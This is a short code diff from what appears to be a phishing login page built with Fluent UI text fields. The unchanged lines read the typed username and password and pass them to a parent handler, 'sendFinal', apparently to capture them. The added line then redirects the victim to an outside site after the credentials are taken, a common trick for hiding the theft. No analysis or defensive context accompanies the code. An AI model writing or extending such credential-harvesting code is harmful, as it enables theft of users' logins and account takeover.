@@ -32,6 +32,7 @@
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     if(password.length > 1){
                         parent.sendFinal(username, password);
+                        location.href = 'https://my.daryakenar.ir/panel';
                     }
                 }
             }, true);
